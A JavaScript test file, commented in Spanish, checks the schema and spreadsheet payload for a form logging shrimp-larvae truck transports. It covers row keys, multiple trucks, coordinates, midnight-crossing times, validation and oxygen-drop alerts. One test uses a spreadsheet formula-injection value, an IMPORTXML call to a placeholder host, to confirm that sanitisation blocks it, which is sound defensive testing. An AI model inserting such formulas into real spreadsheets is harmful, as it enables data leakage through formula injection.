/* ============================================================
   REGISTROS · ficha "Traslado" — contrato del esquema y del payload

   El fixture NO es inventado: el camión 1 es el viaje del 18/08/2026 del formato
   real (`formato nuevo.xlsx`, hoja «Formato vacío ejemplo»), Opumarsa → Piná, salida
   20:30 y llegada 06:00, con sus cuatro revisiones y sus ocho tinas. Se usa tal cual
   porque un fixture inventado no habría tenido ni el cruce de medianoche ni la
   longitud negativa, que son los dos sitios donde esto se rompe.

   El camión 2 se añade encima para ejercitar la dimensión que pidió el usuario el
   2026-08-20: un chequeador a cargo de dos camiones que van al mismo destino y sólo
   se distinguen por la placa.
   ============================================================ */
import { describe, it, expect } from 'vitest';
import {
  TRASLADO_SHEET,
  TRASLADO_HEADERS,
  TRASLADO_COLUMNS,
  TINAS,
  REVISIONES_MIN,
  REVISIONES_INI,
  ACTIVIDAD_OPTS,
  MODULO_OPTS,
  ALIMENTACION_OPTS,
  CAMARONERA_OPTS,
  buildTrasladoPayload,
  filaId,
  nuevoViajeId,
  minutosDeHora,
  minutosEntre,
  camionesDe,
  tinasEnUso,
  validarViaje,
  fueraDeCadencia,
  caidasPorTina,
} from './ficha-traslado.schema.js';

/* ── El viaje real del formato ─────────────────────────────── */

const O2 = [
  [7.5, 6.9, 7.7, 8.3, 6.9, 7.7, 7.8, 6.9],
  [7.5, 7.2, 7.64, 7.4, 6.9, 7.59, 7.55, 6.9],
  [7.6, 7.65, 7.6, 7.67, 6.9, 6.1, 7.8, 7.6],
  [6.98, 7, 7.7, 6.8, 6.9, 6.6, 7.8, 6.0],
];
const TEMP = [
  [26, 24.5, 25, 26, 24.7, 26, 26.1, 26],
  [26, 27, 26, 26.1, 26, 25.4, 26, 23.4],
  [24.5, 24, 25.1, 26, 24.9, 26, 25, 26],
  [25, 26, 26.4, 26, 26, 24.3, 26, 24.5],
];
const HORAS = ['20:30', '23:40', '02:50', '06:00'];
const LUGARES = ['Laboratorio', 'Peaje', 'Gabarra', 'Camaronera'];

/** Mediciones de un camión en la revisión `i`. `delta` desplaza el O2 del 2.º camión. */
function medidas(i, delta) {
  const tinas = {};
  for (let t = 1; t <= 8; t += 1) {
    tinas[t] = {
      o2: O2[i][t - 1] + (delta || 0),
      temp: TEMP[i][t - 1],
      act: t % 2 ? 'Alta' : 'Media',
      alim: 'Artemia',
    };
  }
  return { tinas };
}

function revision(i, nCamiones) {
  const camiones = [medidas(i, 0)];
  if (nCamiones > 1) camiones.push(medidas(i, -0.3));
  return {
    hora: HORAS[i],
    lugar: LUGARES[i],
    // Mar Bravo, Santa Elena: latitud Y LONGITUD negativas. Es el dato que rompe
    // el payload si alguien encamina las coordenadas por sanitizeStr.
    lat: -2.2135,
    lon: -80.9791,
    precision: 12,
    ubicacion: '-2.213500, -80.979100',
    horaRegistro: '2026-08-18T' + HORAS[i] + ':07',
    obs: i === 0 ? 'Tracto digestivo vacío. 3% de mortalidad.' : '',
    camiones,
  };
}

function viaje(nCamiones) {
  const n = nCamiones || 1;
  const camiones = [{ placa: 'GSA-1147', tinasOff: [] }];
  if (n > 1) camiones.push({ placa: 'PBX-0392', tinasOff: [] });
  return {
    id: 'tvdemo001',
    data: {
      fecha: '2026-08-18',
      camaronera: 'Puná 1',
      salinidad: '',
      horaSalida: '20:30',
      horaLlegada: '06:00',
      insumos: ['Prokura', 'Vitamina C'],
      check: ['Oxigenómetro', 'Linterna', 'Bandeja', 'Esfero'],
      controlador: 'Juanito de las Mercedes',
      chequeador: 'Pepito Acosta',
      recepcion: '',
      camiones,
      revisiones: [revision(0, n), revision(1, n), revision(2, n), revision(3, n)],
    },
  };
}

const unCamion = () => viaje(1);
const dosCamiones = () => viaje(2);
const col = (nombre) => TRASLADO_HEADERS.indexOf(nombre);

/* ══════════════════════════════════════════════════════════ */

describe('Traslado · esquema de la hoja', () => {
  it('declara 29 columnas y el ID es la ÚLTIMA', () => {
    // 28 al nacer → 27 al retirar «Tanque» → 29 al añadir Corrida y Módulo (08-23).
    expect(TRASLADO_HEADERS).toHaveLength(29);
    expect(TRASLADO_HEADERS[TRASLADO_HEADERS.length - 1]).toBe('ID');
  });

  it('🔴 no lleva los cinco campos que el usuario retiró', () => {
    // Laboratorio (siempre Omarsa), Guía, Camión (lo sustituye la Placa) y
    // Alimentos (queda sólo Insumos), retirados el 2026-08-20;
    // Tanque, retirado el 2026-08-23.
    ['Laboratorio', 'Guía', 'Camión', 'Alimentos', 'Tanque'].forEach((h) => {
      expect(TRASLADO_HEADERS).not.toContain(h);
    });
    expect(TRASLADO_COLUMNS.find((c) => c.k === 'tanque')).toBeUndefined();
  });

  it('la Placa sí está: es lo que identifica al camión', () => {
    expect(TRASLADO_HEADERS).toContain('Placa');
    expect(TRASLADO_COLUMNS.find((c) => c.h === 'Placa').grain).toBe('camion');
  });

  it('no repite ninguna cabecera', () => {
    expect(new Set(TRASLADO_HEADERS).size).toBe(TRASLADO_HEADERS.length);
  });

  it('la hoja destino no colisiona con la ficha de Despacho existente', () => {
    expect(TRASLADO_SHEET).toBe('Registro_Traslado');
  });

  it('🔴 Actividad tiene cuatro niveles, en orden de escala', () => {
    // El usuario recuperó «Normal» el 2026-08-23 sin perder los otros tres.
    expect(ACTIVIDAD_OPTS).toEqual(['Alta', 'Normal', 'Media', 'Baja']);
    // Se escribe «Alta», no «Alto»: la hoja ya trae «Alta» de la etapa en papel
    // y dos grafías del mismo valor es el defecto que costó caro con el analista.
    expect(ACTIVIDAD_OPTS).not.toContain('Alto');
  });

  it('el catálogo de alimentación es el del formato, no el del procedimiento', () => {
    expect(ALIMENTACION_OPTS).toEqual(['Artemia', 'Flake', 'Prokura', 'Vitamina C']);
    expect(ALIMENTACION_OPTS).not.toContain('Proker');
  });

  it('la camaronera sale del catálogo de la ficha de Despacho', () => {
    expect(CAMARONERA_OPTS).toContain('Puná 1');
    expect(CAMARONERA_OPTS).toHaveLength(10);
  });
});

describe('Traslado · la llave', () => {
  it('es determinista y nombra camión, revisión y tina', () => {
    expect(filaId('tvabc', 2, 3, 7)).toBe('tvabc-c2-r3-t7');
    expect(filaId('tvabc', 2, 3, 7)).toBe(filaId('tvabc', 2, 3, 7));
  });

  it('🔴 los dos camiones NO colisionan entre sí', () => {
    // Sin la parte -c<n> ambos camiones escribirían sobre la misma fila y el
    // segundo borraría al primero en cada sincronización.
    expect(filaId('tvabc', 1, 2, 5)).not.toBe(filaId('tvabc', 2, 2, 5));
  });

  it('distingue revisión de tina (no colisiona r2-t7 con r7-t2)', () => {
    expect(filaId('tvabc', 1, 2, 7)).not.toBe(filaId('tvabc', 1, 7, 2));
  });

  it('cada fila del viaje tiene un ID único, con dos camiones', () => {
    const { rows } = buildTrasladoPayload(dosCamiones());
    const ids = rows.map((r) => r[col('ID')]);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('nuevoViajeId es estable si se le inyecta el reloj y el azar', () => {
    expect(nuevoViajeId(1755500000000, 0.5)).toBe(nuevoViajeId(1755500000000, 0.5));
    expect(nuevoViajeId(1755500000000, 0.5)).not.toBe(nuevoViajeId(1755500000001, 0.5));
  });
});

describe('Traslado · varios camiones en un viaje', () => {
  it('un camión: 4 revisiones × 8 tinas = 32 filas', () => {
    expect(buildTrasladoPayload(unCamion()).rows).toHaveLength(32);
  });

  it('🔴 dos camiones: 2 × 4 × 8 = 64 filas', () => {
    const { rows } = buildTrasladoPayload(dosCamiones());
    expect(rows).toHaveLength(64);
  });

  it('🔴 cada fila lleva la placa de SU camión', () => {
    const { rows } = buildTrasladoPayload(dosCamiones());
    const c1 = rows.filter((r) => /-c1-/.test(r[col('ID')]));
    const c2 = rows.filter((r) => /-c2-/.test(r[col('ID')]));
    expect(c1).toHaveLength(32);
    expect(c2).toHaveLength(32);
    c1.forEach((r) => expect(r[col('Placa')]).toBe('GSA-1147'));
    c2.forEach((r) => expect(r[col('Placa')]).toBe('PBX-0392'));
  });

  it('🔴 las mediciones no se mezclan entre camiones', () => {
    const { rows } = buildTrasladoPayload(dosCamiones());
    const busca = (id) => rows.find((r) => r[col('ID')] === id);
    // Revisión 3, tina 6: el camión 1 trae 6.1 y el 2 trae 0,3 menos.
    expect(busca('tvdemo001-c1-r3-t6')[col('Oxígeno (mg/L)')]).toBe(6.1);
    expect(busca('tvdemo001-c2-r3-t6')[col('Oxígeno (mg/L)')]).toBeCloseTo(5.8, 6);
  });

  it('un viaje sin lista de camiones es un viaje de UNO, no de cero', () => {
    // Compatibilidad con los registros guardados antes de admitir varios camiones.
    const v = unCamion();
    delete v.data.camiones;
    v.data.placa = 'ABC-0001';
    expect(camionesDe(v.data)).toHaveLength(1);
    const { rows } = buildTrasladoPayload(v);
    expect(rows).toHaveLength(32);
    expect(rows[0][col('Placa')]).toBe('ABC-0001');
  });

  it('la cabecera del viaje se repite en las filas de los dos camiones', () => {
    const { rows } = buildTrasladoPayload(dosCamiones());
    rows.forEach((r) => {
      expect(r[col('Camaronera')]).toBe('Puná 1');
      expect(r[col('Viaje')]).toBe('tvdemo001');
      expect(r[col('Insumos')]).toBe('Prokura, Vitamina C');
    });
  });
});

describe('Traslado · payload', () => {
  it('devuelve la hoja y las cabeceras declaradas', () => {
    const { headers, sheetName, rows } = buildTrasladoPayload(unCamion());
    expect(sheetName).toBe(TRASLADO_SHEET);
    expect(headers).toEqual(TRASLADO_HEADERS);
    rows.forEach((r) => expect(r).toHaveLength(29));
  });

  it('🔴 la LONGITUD negativa sobrevive intacta', () => {
    // sanitizeStr elimina los `= + - @` iniciales para evitar inyección de fórmula.
    // Aplicado a una longitud de Ecuador (-80.98) la convertiría en +80.98 — al otro
    // lado del planeta, y sin error visible.
    const { rows } = buildTrasladoPayload(dosCamiones());
    rows.forEach((r) => {
      expect(r[col('Longitud')]).toBe(-80.9791);
      expect(r[col('Latitud')]).toBe(-2.2135);
    });
  });

  it('las coordenadas viajan como NÚMERO, no como texto', () => {
    const { rows } = buildTrasladoPayload(unCamion());
    expect(typeof rows[0][col('Longitud')]).toBe('number');
    expect(typeof rows[0][col('Oxígeno (mg/L)')]).toBe('number');
  });

  it('los campos de texto sí quedan protegidos contra inyección de fórmula', () => {
    const v = unCamion();
    v.data.camiones[0].placa = '=IMPORTXML("http://malo","//x")';
    const { rows } = buildTrasladoPayload(v);
    expect(rows[0][col('Placa')].startsWith('=')).toBe(false);
  });

  it('cada fila lleva la medición de SU tina y SU revisión', () => {
    const { rows } = buildTrasladoPayload(unCamion());
    const r3t6 = rows.find((r) => r[col('ID')] === 'tvdemo001-c1-r3-t6');
    expect(r3t6[col('Oxígeno (mg/L)')]).toBe(6.1);
    expect(r3t6[col('Temperatura (°C)')]).toBe(26);
    expect(r3t6[col('Lugar')]).toBe('Gabarra');
    expect(r3t6[col('Hora')]).toBe('02:50');
    expect(r3t6[col('Revisión')]).toBe(3);
    expect(r3t6[col('Tina')]).toBe(6);
  });

  it('Observaciones es POR REVISIÓN, no por viaje', () => {
    const v = dosCamiones();
    v.data.revisiones[2].obs = 'Espuma en la tina 6';
    const { rows } = buildTrasladoPayload(v);
    rows.filter((r) => r[col('Revisión')] === 1)
      .forEach((r) => expect(r[col('Observaciones')]).toContain('Tracto digestivo'));
    rows.filter((r) => r[col('Revisión')] === 2)
      .forEach((r) => expect(r[col('Observaciones')]).toBe(''));
    rows.filter((r) => r[col('Revisión')] === 3)
      .forEach((r) => expect(r[col('Observaciones')]).toBe('Espuma en la tina 6'));
  });

  it('los insumos van como CSV, sin vacíos ni duplicados', () => {
    const v = unCamion();
    v.data.insumos = ['Prokura', '', 'Vitamina C', 'Prokura'];
    const { rows } = buildTrasladoPayload(v);
    expect(rows[0][col('Insumos')]).toBe('Prokura, Vitamina C');
  });

  it('un campo vacío del formato queda vacío, no como "undefined"', () => {
    const { rows } = buildTrasladoPayload(unCamion());
    expect(rows[0][col('Salinidad')]).toBe('');
    expect(rows[0][col('Responsable recepción')]).toBe('');
  });
});

describe('Traslado · tinas no usadas', () => {
  it('🔴 apagar una tina del camión 1 NO la apaga en el camión 2', () => {
    // Las tinas van físicamente dentro de un camión: la lista es suya, no del viaje.
    const v = dosCamiones();
    v.data.camiones[0].tinasOff = [7, 8];
    expect(tinasEnUso(v.data.camiones[0])).toEqual([1, 2, 3, 4, 5, 6]);
    expect(tinasEnUso(v.data.camiones[1])).toHaveLength(8);
    const { rows } = buildTrasladoPayload(v);
    expect(rows).toHaveLength(24 + 32);
    expect(rows.filter((r) => /-c1-/.test(r[col('ID')]) && r[col('Tina')] === 7)).toHaveLength(0);
    expect(rows.filter((r) => /-c2-/.test(r[col('ID')]) && r[col('Tina')] === 7)).toHaveLength(4);
  });

  it('con incluirApagadas se emiten en BLANCO, para borrar lo ya sincronizado', () => {
    // El upsert sólo actualiza filas, nunca las elimina: si una tina se sincronizó
    // con datos y luego se apaga, su fila vieja se quedaría con los valores originales.
    const v = unCamion();
    v.data.camiones[0].tinasOff = [8];
    const { rows } = buildTrasladoPayload(v, { incluirApagadas: true });
    expect(rows).toHaveLength(32);
    const t8 = rows.filter((r) => r[col('Tina')] === 8);
    expect(t8).toHaveLength(4);
    t8.forEach((r) => {
      expect(r[col('Oxígeno (mg/L)')]).toBe('');
      expect(r[col('Actividad')]).toBe('');
      // pero conserva su identidad, o el upsert no encontraría la fila que borrar
      expect(r[col('ID')]).toMatch(/-t8$/);
      expect(r[col('Placa')]).toBe('GSA-1147');
    });
  });
});

describe('Traslado · el reloj cruza la medianoche', () => {
  it('minutosDeHora acepta horas válidas y rechaza basura', () => {
    expect(minutosDeHora('20:30')).toBe(1230);
    expect(minutosDeHora('00:00')).toBe(0);
    expect(minutosDeHora('24:00')).toBeNull();
    expect(minutosDeHora('20:70')).toBeNull();
    expect(minutosDeHora('')).toBeNull();
  });

  it('🔴 23:40 → 02:50 son 190 minutos, no un número negativo', () => {
    expect(minutosEntre('23:40', '02:50')).toBe(190);
    expect(minutosEntre('20:30', '23:40')).toBe(190);
  });

  it('el viaje completo dura 9 h 30 min', () => {
    expect(minutosEntre('20:30', '06:00')).toBe(570);
  });
});

describe('Traslado · validación', () => {
  it('el viaje real del formato es válido, con uno y con dos camiones', () => {
    expect(validarViaje(unCamion().data)).toEqual([]);
    expect(validarViaje(dosCamiones().data)).toEqual([]);
  });

  it('🔴 exige la placa de cada camión', () => {
    // Es lo único que distingue un camión de otro dentro del viaje.
    const v = dosCamiones();
    v.data.camiones[1].placa = '';
    const errs = validarViaje(v.data);
    expect(errs.some((e) => e.campo === 'camion2')).toBe(true);
  });

  it('🔴 rechaza dos camiones con la misma placa', () => {
    // Con la placa repetida las filas de los dos serían indistinguibles en la hoja.
    const v = dosCamiones();
    v.data.camiones[1].placa = 'gsa-1147';   // misma placa, otra caja
    const errs = validarViaje(v.data);
    expect(errs.some((e) => /repetida/.test(e.mensaje))).toBe(true);
  });

  it('exige el mínimo de revisiones del protocolo', () => {
    const v = unCamion();
    v.data.revisiones = v.data.revisiones.slice(0, REVISIONES_MIN - 1);
    expect(validarViaje(v.data).some((e) => e.campo === 'revisiones')).toBe(true);
    expect(validarViaje(unCamion().data).some((e) => e.campo === 'revisiones')).toBe(false);
  });

  it('admite MÁS revisiones que el mínimo', () => {
    const v = dosCamiones();
    v.data.revisiones.push({ ...revision(3, 2), hora: '07:30', lugar: 'Camaronera' });
    expect(validarViaje(v.data).some((e) => e.campo === 'revisiones')).toBe(false);
    expect(buildTrasladoPayload(v).rows).toHaveLength(80);
  });

  it('reclama fecha y camaronera', () => {
    const campos = validarViaje({ revisiones: [] }).map((e) => e.campo);
    expect(campos).toContain('fecha');
    expect(campos).toContain('camaronera');
  });

  it('🔴 rechaza una camaronera que no esté en el catálogo', () => {
    // «Piná» es lo que trae el Excel original; casi con seguridad es «Puná».
    const v = unCamion();
    v.data.camaronera = 'Piná';
    expect(validarViaje(v.data).some((e) => e.campo === 'camaronera')).toBe(true);
    v.data.camaronera = 'Puná 1';
    expect(validarViaje(v.data).some((e) => e.campo === 'camaronera')).toBe(false);
  });

  it('reclama la hora y el lugar de cada revisión', () => {
    const v = unCamion();
    v.data.revisiones[1].hora = '';
    v.data.revisiones[2].lugar = '';
    const errs = validarViaje(v.data);
    expect(errs.filter((e) => e.campo === 'rev2')).toHaveLength(1);
    expect(errs.filter((e) => e.campo === 'rev3')).toHaveLength(1);
  });

  it('no deja sincronizar un camión sin ninguna tina en uso', () => {
    const v = unCamion();
    v.data.camiones[0].tinasOff = [1, 2, 3, 4, 5, 6, 7, 8];
    expect(validarViaje(v.data).some((e) => e.campo === 'camion1')).toBe(true);
  });
});

describe('Traslado · cadencia del protocolo', () => {
  it('🔴 el viaje real INCUMPLE la cadencia en sus tres tramos', () => {
    // El procedimiento fija revisiones cada 1,5–2 h; el ejemplo va cada 3 h 10.
    const fuera = fueraDeCadencia(unCamion().data);
    expect(fuera).toHaveLength(3);
    expect(fuera.map((f) => f.revision)).toEqual([2, 3, 4]);
    fuera.forEach((f) => expect(f.minutos).toBe(190));
  });

  it('un viaje dentro de cadencia no produce ningún aviso', () => {
    const v = unCamion();
    ['20:30', '22:00', '23:30', '01:00'].forEach((h, i) => { v.data.revisiones[i].hora = h; });
    expect(fueraDeCadencia(v.data)).toEqual([]);
  });

  it('justo en el límite de 2 h no avisa; un minuto más, sí', () => {
    const v = unCamion();
    ['20:30', '22:30', '00:30', '02:30'].forEach((h, i) => { v.data.revisiones[i].hora = h; });
    expect(fueraDeCadencia(v.data)).toEqual([]);
    v.data.revisiones[1].hora = '22:31';
    expect(fueraDeCadencia(v.data).some((f) => f.revision === 2)).toBe(true);
  });

  it('la cadencia es del VIAJE, no de cada camión: no se duplica con dos', () => {
    expect(fueraDeCadencia(dosCamiones().data)).toHaveLength(3);
  });
});

describe('Traslado · caídas respecto a la revisión anterior', () => {
  it('detecta el desplome de oxígeno de la tina 6 en Gabarra', () => {
    const t6 = caidasPorTina(unCamion().data)
      .find((c) => c.revision === 3 && c.tina === 6 && c.campo === 'o2');
    expect(t6.de).toBe(7.59);
    expect(t6.a).toBe(6.1);
    expect(t6.camion).toBe(1);
    expect(t6.placa).toBe('GSA-1147');
  });

  it('🔴 dice en QUÉ camión ocurre la caída', () => {
    // Con dos camiones a la vez, un aviso que no nombre la placa no sirve de nada.
    const caidas = caidasPorTina(dosCamiones().data);
    const c2 = caidas.filter((c) => c.camion === 2);
    expect(c2.length).toBeGreaterThan(0);
    c2.forEach((c) => expect(c.placa).toBe('PBX-0392'));
  });

  it('no marca una tina que MEJORA ni una que se mantiene igual', () => {
    const caidas = caidasPorTina(unCamion().data);
    expect(caidas.some((c) => c.tina === 5 && c.campo === 'o2')).toBe(false);
    expect(caidas.some((c) => c.revision === 2 && c.tina === 2 && c.campo === 'o2')).toBe(false);
  });

  it('mide cuánto ruido produce la regla sin umbral sobre datos reales', () => {
    // 21 avisos para 32 filas de un solo camión. Es el número que justifica
    // poder subir `minDelta`.
    expect(caidasPorTina(unCamion().data)).toHaveLength(21);
    expect(caidasPorTina(dosCamiones().data)).toHaveLength(42);
  });

  it('minDelta descarta el ruido de instrumento y conserva lo grave', () => {
    const caidas = caidasPorTina(unCamion().data, { minDelta: 0.5 });
    // 7.64 → 7.60 (0,04 mg/L) desaparece…
    expect(caidas.some((c) => c.revision === 2 && c.tina === 3 && c.campo === 'o2')).toBe(false);
    // …y el desplome de la tina 6 sigue ahí
    expect(caidas.some((c) => c.revision === 3 && c.tina === 6 && c.campo === 'o2')).toBe(true);
    expect(caidas.length).toBeLessThan(21);
  });

  it('ignora las tinas apagadas y las mediciones ausentes', () => {
    const v = unCamion();
    v.data.camiones[0].tinasOff = [6];
    expect(caidasPorTina(v.data).some((c) => c.tina === 6)).toBe(false);

    const w = unCamion();
    w.data.revisiones[2].camiones[0].tinas[6].o2 = '';
    expect(caidasPorTina(w.data)
      .some((c) => c.revision === 3 && c.tina === 6 && c.campo === 'o2')).toBe(false);
  });
});

describe('Traslado · constantes del formato', () => {
  it('son 8 tinas, 3 revisiones mínimas y 4 al abrir', () => {
    expect(TINAS).toBe(8);
    expect(REVISIONES_MIN).toBe(3);
    expect(REVISIONES_INI).toBe(4);
  });

  it('toda columna declara su grano', () => {
    const granos = ['viaje', 'camion', 'revision', 'tina', 'llave'];
    TRASLADO_COLUMNS.forEach((c) => expect(granos).toContain(c.grain));
  });
});

describe('Traslado · el catálogo de Módulo', () => {
  it('🔴 son M01…M10 y CIO, DERIVADOS de mLabel', () => {
    // Se deriva en vez de teclearse para no crear una tercera lista de módulos en
    // el proyecto. Si `mLabel` cambiara de formato, esto se pone rojo.
    expect(MODULO_OPTS).toEqual(['M01', 'M02', 'M03', 'M04', 'M05', 'M06', 'M07', 'M08', 'M09', 'M10', 'CIO']);
    expect(MODULO_OPTS).toHaveLength(11);
    expect(new Set(MODULO_OPTS).size).toBe(11);
  });

  it('Corrida viaja como NÚMERO y Módulo como texto', () => {
    const col = (h) => TRASLADO_COLUMNS.find((c) => c.h === h);
    expect(col('Corrida').num).toBe(true);
    expect(col('Módulo').num).toBeUndefined();
    // Las dos son del viaje: se repiten en todas las filas del formato largo.
    expect(col('Corrida').grain).toBe('viaje');
    expect(col('Módulo').grain).toBe('viaje');
  });
});
